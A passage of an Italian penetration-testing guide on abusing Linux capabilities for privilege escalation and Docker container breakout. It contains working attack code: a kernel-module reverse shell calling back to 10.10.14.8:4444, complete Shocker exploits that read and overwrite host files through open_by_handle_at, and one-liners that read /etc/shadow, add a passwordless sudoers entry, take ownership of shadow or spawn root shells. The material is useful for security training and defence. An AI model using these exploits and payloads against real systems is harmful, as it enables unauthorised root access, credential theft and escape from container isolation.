In un normale container Linux rootful, l'obiettivo è il **kernel host condiviso** e ciò costituisce quindi un breakout diretto. La capability deve essere effettiva nello user namespace iniziale, perché il caricamento dei moduli non è namespaced. Un runtime isolato tramite userspace-kernel o VM, come gVisor, Kata o Hyper-V, cambia quale confine del kernel è raggiungibile. Il caricamento dei moduli può comunque essere bloccato da `modules_disabled`, kernel lockdown, imposizione delle firme, seccomp o un LSM.<sup>[[14]](#references)</sup>

**Esempio con un binario**

Nell'esempio seguente, il binario **`python`** dispone di questa capability.

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

Per impostazione predefinita, il comando **`modprobe`** cerca i file con l’elenco delle dipendenze e i file map nella directory **`/lib/modules/$(uname -r)`**.\
Per sfruttare questo comportamento, creiamo una cartella **lib/modules** falsa:

```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

Quindi **compila il modulo del kernel di cui trovi 2 esempi qui sotto e copialo** in questa cartella:

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

Infine, esegui il codice Python necessario per caricare questo modulo del kernel:

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**Esempio 2 con un binario**

Nel seguente esempio, il binario **`kmod`** ha questa capability.

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

Il che significa che è possibile usare il comando **`insmod`** per inserire un modulo del kernel. Segui l'esempio qui sotto per ottenere una **reverse shell** sfruttando questo privilegio.

**Esempio con ambiente (Docker breakout)**

Puoi controllare le capabilities abilitate all'interno del container Docker usando:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

All'interno dell'output precedente puoi vedere che la capability **SYS_MODULE** è abilitata.<sup>[[14]](#references)</sup>

**Crea** il **kernel module** che eseguirà una reverse shell e il **Makefile** per **compilarlo**:

```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

> [!WARNING]
> Il carattere di spaziatura prima di ogni parola make nel Makefile **deve essere un tab, non spazi**!

Esegui `make` per compilarlo.

```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

Infine, avvia `nc` in una shell e **carica il modulo** da un'altra: catturerai la shell nel processo `nc`:

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**Il codice di questa tecnica è stato copiato dal laboratorio «Abusing SYS_MODULE Capability» di** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

Un altro esempio di questa tecnica è disponibile su [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) consente a un processo di **ignorare i permessi di lettura dei file e i permessi di lettura ed esecuzione delle directory**. Autorizza anche `open_by_handle_at(2)`, che interpreta un file handle valido rispetto a un file descriptor di mount dello stesso filesystem montato. Non espone automaticamente ogni file al di fuori del mount namespace del processo. Per evadere tramite un file handle servono anche un riferimento a un filesystem pertinente sull'host, handle validi o individuabili, un filesystem e una disposizione dello storage compatibili, e l'assenza di blocchi da parte del runtime o dell'LSM. La storica tecnica Docker «Shocker» ha dimostrato una combinazione di questo tipo in configurazioni vulnerabili, come analizzato [qui](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
**Ciò significa che puoi ignorare i controlli dei permessi di lettura dei file e quelli di lettura/esecuzione delle directory**.<sup>[[14]](#references)</sup>

Per un **eseguibile personalizzato** dotato di questa capability, verifica cosa legge e cosa restituisce al chiamante. Un helper che scansiona i file, accetta un percorso protetto scelto dal chiamante e una lunghezza di prefisso scelta dal chiamante, quindi rivela il digest completo di quel prefisso, può fungere da oracolo di lettura dei file: dopo aver recuperato i primi `n-1` byte, confronta i digest candidati di ogni possibile byte successivo con il digest dell'helper per la lunghezza `n`. Questo non dipende dal trovare una collisione crittografica né specificamente da MD5; dipende da query ripetute con lunghezza scelta e da digest visibili e deterministici. Un digest dell'intero file senza controllo del prefisso non dimostra lo stesso percorso. Verifica che il chiamante possa eseguire l'helper, che la file capability diventi effettiva, che il percorso scelto sia raggiungibile nel suo mount namespace e che il comportamento di input/output esista davvero. Non eseguire un helper privilegiato sconosciuto solo per verificarlo durante un'enumerazione passiva.

**Esempio con binary**

Il binary può leggere i file accessibili nei suoi namespace. Quindi, se un file come `tar` ha questa capability, può leggere il file shadow:

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```

**Esempio con binary2**

In questo caso, supponiamo che il binario **`python`** abbia questa capability. Per elencare i file di root, puoi eseguire:

```python
import os
for r, d, f in os.walk('/root'):
    for filename in f:
        print(filename)
```

E per leggere un file potresti fare:

```python
print(open("/etc/shadow", "r").read())
```

**Esempio nell'ambiente (Docker breakout)**

Puoi controllare le capabilities abilitate all'interno del container Docker usando `capsh --print`.<sup>[[14]](#references)[[26]](#references)</sup>

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Nell'output precedente puoi vedere che la capability **DAC_READ_SEARCH** è abilitata. Questa aggira i controlli DAC di lettura/ricerca e consente l'uso di `open_by_handle_at(2)`; di per sé, non è una capability per il debugging dei processi.<sup>[[14]](#references)</sup>

Puoi scoprire come funziona il seguente exploit in [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), ma in breve, **CAP_DAC_READ_SEARCH** consente di attraversare il file system senza controlli dei permessi e permette l'uso di `open_by_handle_at(2)`; questo può esporre file aperti da altri processi quando i namespace e i mount pertinenti sono raggiungibili.<sup>[[13]](#references)[[14]](#references)</sup>

L'exploit originale che sfrutta questi permessi per leggere file dall'host è disponibile qui: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); di seguito trovi una **versione modificata che consente di passare il file da leggere come primo argomento e di salvare il risultato in un file**.<sup>[[12]](#references)</sup>

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
    h->handle_type);
    for (int i = 0; i < h->handle_bytes; ++i) {
        fprintf(stderr,"0x%02x", h->f_handle[i]);
        if ((i + 1) % 20 == 0)
        fprintf(stderr,"\n");
        if (i < h->handle_bytes - 1)
        fprintf(stderr,", ");
    }
    fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;
    path = strchr(path, '/');
    // recursion stops if path has been resolved
    if (!path) {
        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }

    ++path;
    fprintf(stderr, "[*] Resolving '%s'\n", path);
    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        die("[-] open_by_handle_at");
    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");
    for (;;) {
        de = readdir(dir);
        if (!de)
        break;
        fprintf(stderr, "[*] Found %s\n", de->d_name);
        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
            ino = de->d_ino;
            break;
        }
    }

    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
    if (de) {
        for (uint32_t i = 0; i < 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &i, sizeof(i));
            if ((i % (1<<20)) == 0)
                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                closedir(dir);
                close(fd);
                dump_handle(&outh);
                return find_handle(bfd, path, &outh, oh);
            }
        }
    }
    closedir(dir);
    close(fd);
    return 0;
}


int main(int argc,char* argv[] )
{
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };

    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

    read(0, buf, 1);

    // get a FS reference from something mounted in from outside
    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
        die("[-] open");

    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");

    fprintf(stderr, "[!] Got a final handle!\n");
    dump_handle(&h);

    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
        die("[-] open_by_handle");

    memset(buf, 0, sizeof(buf));
    if (read(fd2, buf, sizeof(buf) - 1) < 0)
        die("[-] read");

    printf("Success!!\n");

    FILE *fptr;
    fptr = fopen(argv[2], "w");
    fprintf(fptr,"%s", buf);
    fclose(fptr);

    close(fd2); close(fd1);

    return 0;
}
```

> [!WARNING]
> L'exploit deve trovare un puntatore a qualcosa montato sull'host. L'exploit originale usava il file /.dockerinit, mentre questa versione modificata usa /etc/hostname. Se l'exploit non funziona, potrebbe essere necessario impostare un file diverso. Per trovare un file montato sull'host, basta eseguire il comando mount:

![CAP SYS MODULE - CAP DAC READ SEARCH: L'exploit deve trovare un puntatore a qualcosa montato sull'host. L'exploit originale usava il file /.dockerinit e questa versione modificata usa...](<../../images/image (407) (1).png>)

**Il codice di questa tecnica è stato copiato dal laboratorio "Abusing DAC_READ_SEARCH Capability" di** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Questa capability aggira i controlli delle autorizzazioni di lettura e scrittura dei file e la maggior parte dei controlli di esecuzione**; per eseguire un file normale, è comunque necessario che sia impostato almeno un bit di esecuzione. Non aggira i mount in sola lettura, lo stato immutabile o un diniego da parte di un LSM.<sup>[[14]](#references)</sup>

Cerca i file che diventano leggibili o scrivibili grazie all'appartenenza a un gruppo privilegiato; i target utili dipendono dalla proprietà e dai bit di modalità del target.<sup>[[14]](#references)</sup>

**Esempio con un binario**

In questo esempio vim dispone di questa capability, quindi puoi modificare qualsiasi file, come _passwd_, _sudoers_ o _shadow_:

```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```

**Esempio con binario 2**

In questo esempio, il binario **`python`** avrà questa capability. Potresti usare python per sovrascrivere qualsiasi file:

```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```

**Esempio con ambiente + CAP_DAC_READ_SEARCH (Docker breakout)**

`CAP_DAC_READ_SEARCH` consente `open_by_handle_at(2)`, ma **non** bypassa i controlli dei permessi di scrittura. Per scrivere tramite un handle risolto, il processo deve inoltre avere accesso in scrittura in base al proprio UID/GID effettivo del filesystem o alle ACL, oppure disporre di `CAP_DAC_OVERRIDE`. Anche il riferimento al filesystem rilevante sull’host, gli handle di file supportati, un mount scrivibile e le policy del runtime/LSM devono consentire l’operazione. Verifica le capability effettive e l’identità: nessuna delle due capability, da sola, dimostra che esista una destinazione scrivibile sull’host. Vedi [capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) e [open_by_handle_at(2)](https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html).<sup>[[14]](#references)[[26]](#references)</sup>

Per prima cosa, leggi la sezione precedente che [**abusa della capability DAC_READ_SEARCH per leggere file arbitrari**](linux-capabilities.md#cap_dac_read_search) dell’host e **compila** l’exploit.\
Il seguente esempio storico tenta di aprire un file risolto con `O_RDWR`; riesce solo se sono soddisfatte le condizioni precedenti relative al filesystem e ai permessi di scrittura:

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
  unsigned int handle_bytes;
  int handle_type;
  unsigned char f_handle[8];
};
void die(const char * msg) {
  perror(msg);
  exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
    h -> handle_type);
  for (int i = 0; i < h -> handle_bytes; ++i) {
    fprintf(stderr, "0x%02x", h -> f_handle[i]);
    if ((i + 1) % 20 == 0)
      fprintf(stderr, "\n");
    if (i < h -> handle_bytes - 1)
      fprintf(stderr, ", ");
  }
  fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
  int fd;
  uint32_t ino = 0;
  struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
  };
  DIR * dir = NULL;
  struct dirent * de = NULL;
  path = strchr(path, '/');
  // recursion stops if path has been resolved
  if (!path) {
    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
    oh -> handle_type = 1;
    oh -> handle_bytes = 8;
    return 1;
  }
  ++path;
  fprintf(stderr, "[*] Resolving '%s'\n", path);
  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
    die("[-] open_by_handle_at");
  if ((dir = fdopendir(fd)) == NULL)
    die("[-] fdopendir");
  for (;;) {
    de = readdir(dir);
    if (!de)
      break;
    fprintf(stderr, "[*] Found %s\n", de -> d_name);
    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
      ino = de -> d_ino;
      break;
    }
  }
  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
  if (de) {
    for (uint32_t i = 0; i < 0xffffffff; ++i) {
      outh.handle_bytes = 8;
      outh.handle_type = 1;
      memcpy(outh.f_handle, & ino, sizeof(ino));
      memcpy(outh.f_handle + 4, & i, sizeof(i));
      if ((i % (1 << 20)) == 0)
        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
        closedir(dir);
        close(fd);
        dump_handle( & outh);
        return find_handle(bfd, path, & outh, oh);
      }
    }
  }
  closedir(dir);
  close(fd);
  return 0;
}
int main(int argc, char * argv[]) {
  char buf[0x1000];
  int fd1, fd2;
  struct my_file_handle h;
  struct my_file_handle root_h = {
    .handle_bytes = 8,
    .handle_type = 1,
    .f_handle = {
      0x02,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    }
  };
  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
  read(0, buf, 1);
  // get a FS reference from something mounted in from outside
  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
    die("[-] open");
  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
    die("[-] Cannot find valid handle!");
  fprintf(stderr, "[!] Got a final handle!\n");
  dump_handle( & h);
  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
    die("[-] open_by_handle");
  char * line = NULL;
  size_t len = 0;
  FILE * fptr;
  ssize_t read;
  fptr = fopen(argv[2], "r");
  while ((read = getline( & line, & len, fptr)) != -1) {
    write(fd2, line, read);
  }
  printf("Success!!\n");
  close(fd2);
  close(fd1);
  return 0;
}
```

Per evadere dal container Docker, potresti **scaricare** dall'host i file `/etc/shadow` e `/etc/passwd`, **aggiungere** un **nuovo utente** e usare **`shocker_write`** per sovrascriverli. Quindi, **accedere** tramite **ssh**.

**Il codice di questa tecnica è stato copiato dal laboratorio «Abusing DAC_OVERRIDE Capability» di** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Questa capability consente a un processo di modificare la proprietà dei file**.<sup>[[14]](#references)</sup>

**Esempio con un binario**

Supponiamo che il binario **`python`** abbia questa capability: puoi modificare il proprietario di un file come **`shadow`**, quindi usare l'accesso ottenuto per modificarlo, se gli altri permessi lo consentono:

```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

Oppure con il binario **`ruby`** dotato di questa capability:

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

## CAP_FOWNER

**Questa capability aggira i controlli di proprietà per molte operazioni sui file, inclusa la modifica dei permessi**.<sup>[[14]](#references)</sup>

**Esempio con un binario**

Se Python ha questa capability, puoi modificare i permessi del file shadow, **cambiare la password di root** ed escalare i privilegi:

```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```

### CAP_SETUID

**Questa capability consente a un processo di modificare il proprio user ID effettivo, nel rispetto delle regole sulle credenziali e sulle capability applicate dal kernel**.<sup>[[14]](#references)</sup>

**Esempio con un binario**

Se Python dispone di questa **capability**, puoi abusarne molto facilmente per ottenere privilegi root:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**Un altro modo:**

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```

Per un eseguibile **custom** con `CAP_SETUID` effettivo, esamina il percorso del codice raggiungibile invece di presumere che la capability, da sola, conceda una shell. Il testo controllato dall'utente passato come *format string* a [`printf`](https://man7.org/linux/man-pages/man3/printf.3.html) può esporre o modificare la memoria del processo; una transizione di privilegi utile dipende comunque da una chiamata vulnerabile, da un input controllabile e da un'azione successiva a `setuid(0)`. Se quell'azione avvia un helper esterno tramite nome, verifica l'identità effettiva al momento dell'avvio, il `PATH` effettivo e se una directory cercata prima è scrivibile e attraversabile dall'utente. Una file capability inefficace, `no_new_privs`, un percorso fisso e attendibile per l'helper o un ramo non raggiungibile cambiano il risultato. Esamina il binario o il codice sorgente disponibile offline; durante la normale enumerazione, non eseguire un helper privilegiato sospetto.

## CAP_SETGID

**Questa capability consente a un processo di cambiare il proprio group ID effettivo, nel rispetto delle regole sulle credenziali e sulle capability applicate dal kernel**.<sup>[[14]](#references)</sup>

Ci sono molti file che puoi **sovrascrivere per ottenere un'escalation dei privilegi**; [**qui puoi trovare qualche idea**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Esempio con un binario**

In questo caso, cerca i file interessanti leggibili da un gruppo, perché puoi impersonare qualsiasi gruppo:

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Una volta individuato un file di cui puoi abusare (leggendolo o scrivendoci) per aumentare i privilegi, puoi **ottenere una shell impersonando il gruppo interessante** con:

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

In questo caso è stato impersonato il gruppo shadow, così puoi leggere il file `/etc/shadow`:

```bash
cat /etc/shadow
```

### Catena combinata: CAP_SETGID + CAP_CHOWN

Quando entrambe le capabilities sono disponibili nello stesso helper, una catena pratica è:

1. Imposta EGID su `shadow` (o su un altro gruppo privilegiato).
2. Usa `chown` su `/etc/shadow` per impostare il tuo UID mantenendo il gruppo `shadow`.
3. Leggi un hash target e fai cracking/pivot.

```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```

Questo evita di dover ottenere direttamente i privilegi di root completi ed è spesso sufficiente per spostarsi sfruttando il riutilizzo delle credenziali.

Se **docker** è installato, potresti **impersonare** il **gruppo docker** e abusarne per comunicare con il [**socket docker** e aumentare i privilegi](#writable-docker-socket).

## CAP_SETFCAP

**Questa capability consente a un processo di impostare le capability dei file**.<sup>[[14]](#references)</sup>

**Esempio con un binario**

Se python dispone di questa **capability**, puoi abusarne molto facilmente per aumentare i privilegi fino a root:

```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```

> [!WARNING]
> Un nuovo set di capability scritto su un file sostituisce quello precedente; se poi l'helper viene eseguito con solo le nuove capability, potrebbe non conservare più `CAP_SETFCAP` per aggiornare un altro file.<sup>[[14]](#references)[[25]](#references)</sup>

Una volta ottenuta la [SETUID capability](linux-capabilities.md#cap_setuid), puoi consultare la relativa sezione per vedere come effettuare un'escalation dei privilegi.

**Esempio con l'ambiente (Docker breakout)**

Il set di capability predefinito documentato da Docker include **CAP_SETFCAP**, ma il set effettivo dipende dalla configurazione del runtime.<sup>[[19]](#references)</sup>
Puoi ispezionare le capability del processo con:

```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

Questa capability consente di scrivere file capabilities, ma da sola non concede tali capabilities al processo corrente né aggira le regole relative ai file, al bounding set e ai namespace applicate quando il file viene eseguito.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```

Le capability consentite del file sono limitate dal capability bounding set del processo e il bit effective del file controlla se il set permitted del file viene aggiunto al set effective del processo. Per questo motivo, aggiungere capability a un file non rende automaticamente utilizzabile in fase di esecuzione ogni capability richiesta.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) consente diverse operazioni sensibili, tra cui l'accesso a `/dev/mem`, `/dev/kmem` o `/proc/kcore`, la modifica di `mmap_min_addr`, l'accesso alle system call `ioperm(2)` e `iopl(2)` e vari comandi relativi ai dischi. Anche `FIBMAP ioctl(2)` è abilitato da questa capability, e in [passato](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) ha causato problemi. Come indicato nella man page, consente inoltre al possessore di eseguire varie operazioni specifiche del dispositivo su altri dispositivi.<sup>[[14]](#references)</sup>

Questo può essere utile per la **privilege escalation** e il **Docker breakout**.<sup>[[14]](#references)</sup>

La capability da sola non espone un'interfaccia utile. Per un container breakout servono anche un dispositivo o una risorsa host accessibili, autorizzazioni per device-cgroup e filesystem e una tecnica specifica per l'hardware e il kernel. `/dev/mem` con restrizioni rigorose, il kernel lockdown, la virtualizzazione, seccomp e le policy LSM spesso eliminano i percorsi generici. Verifica prima la capability e l'esposizione:

```bash
capsh --print | grep cap_sys_rawio
ls -l /dev/mem /dev/port 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

Se `/dev/mem` è l'interfaccia approvata, un laboratorio usa e getta può dimostrare la divulgazione di memoria dei nodi oltre i confini leggendo e calcolando l'hash di un intervallo selezionato dalla mappa hardware di quel laboratorio:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Non indovinare l’intervallo: la lettura di alcune regioni MMIO può avere effetti collaterali e un indirizzo valido su una piattaforma può controllare l’hardware o la memoria del kernel su un’altra. La modifica della memoria del kernel o il controllo di un dispositivo richiedono una prova approvata e specifica per la piattaforma; non esiste un esempio universale e sicuro di scrittura raw.

## CAP_KILL

**Questa capability consente di aggirare i controlli delle autorizzazioni per l’invio di segnali ai processi nei casi definiti dal kernel**.<sup>[[14]](#references)</sup>

**Esempio con binary**

Supponiamo che il binary **`python`** abbia questa capability. Se potessi **anche modificare la configurazione di un servizio o di un socket** (o qualsiasi file di configurazione relativo a un servizio), potresti installarvi una backdoor, poi terminare il processo relativo a quel servizio e attendere che il nuovo file di configurazione venga eseguito con la backdoor.

```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```

**Privesc with kill**

Se hai le capability di kill e c'è un **programma Node in esecuzione come root** (o come un altro utente), probabilmente potresti **inviargli** il **segnale SIGUSR1** e fargli **aprire il debugger di Node**, a cui potrai connetterti.

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```


{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Questa capability consente di associarsi alle porte Internet inferiori a 1024.** Non concede direttamente privilegi più ampi né consente di aumentare i privilegi.<sup>[[14]](#references)</sup>

**Esempio con un binario**

Se **`python`** possiede questa capability, potrà rimanere in ascolto su qualsiasi porta e persino connettersi da essa a qualsiasi altra porta (alcuni servizi richiedono connessioni provenienti da porte privilegiate).

{{#tabs}}
{{#tab name="Listen"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
